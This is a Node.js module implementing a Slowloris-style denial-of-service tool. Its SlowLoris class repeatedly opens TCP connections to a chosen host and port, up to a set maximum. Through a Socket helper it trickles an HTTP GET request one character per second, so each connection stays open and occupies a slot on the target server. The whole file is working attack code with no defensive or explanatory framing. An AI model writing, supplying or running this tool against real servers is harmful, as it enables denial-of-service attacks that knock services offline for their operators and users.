const net = require('net');
var EventEmitter = require('events').EventEmitter;
var util = require('util');
class SlowLoris {
    constructor(host,port,connections){
        var self = this;
        self.internalevents = new EventEmitter()
        self.internalevents.setMaxListeners(connections)
        self.activeConnections = 0;
        self.maxConnections = connections;
        self.target = {
            host:host,
            port:port
        }
        self.sockets = [];
        
        self.interval = setInterval(function (){
            self.update()
        },100)
    }
    update(){
        var self = this;
        if(this.activeConnections < this.maxConnections){
                self.spawnConnection()
        }
    }
    stop(){
        this.internalevents.emit('stop')
        clearInterval(this.interval)
    }
    spawnConnection(){
        var self = this;
        var socket = new Socket('GET / HTTP/1.0\r\n'+'Host: google.com:80\r\n'+'\r\n',this.target.host,this.target.port,100,self.internalevents)
        self.activeConnections++;
        socket.on('open',()=>{
            self.emit('update',{
                activeConnections:self.activeConnections
            })
        })
        socket.on('close',()=>{
            self.activeConnections--;
            self.emit('update',{
                activeConnections:self.activeConnections
            })
        })
    }
}
util.inherits(SlowLoris, EventEmitter);

class Socket {
    constructor(data,host,port,wait,events){
        var self = this;
        self.wait = 1000;
        self.data = data;
        self.client = net.createConnection({port:port,host:host})
        self.client.setNoDelay(true)
        self.events = events;
        self.events.on('stop',()=>{
            self.stop()
        })
        self.client.on('data', (data) => {
        });
        self.client.on('error', function(error) {
        })
        self.client.on('close',()=>{
            self.stop()
        })
        self.client.on('connect',()=>{
            self.emit('open');
            self.write()
        })
    }
    stop(){
        var self = this;
        self.client.end()
        self.events.removeListener('stop',self.stop)
        clearTimeout(self.timeout)
        self.emit('close');
    }
    write(){
        var self = this;
        if(self.data.length === 0){
            self.client.end();
        }else{
            var bit = self.data[0];
            self.data = self.data.slice(1)
            self.client.write(bit,()=>{
                self.timeout = setTimeout(()=>self.write(),self.wait)
            });
        }
    }
}
util.inherits(Socket, EventEmitter);

module.exports = SlowLoris;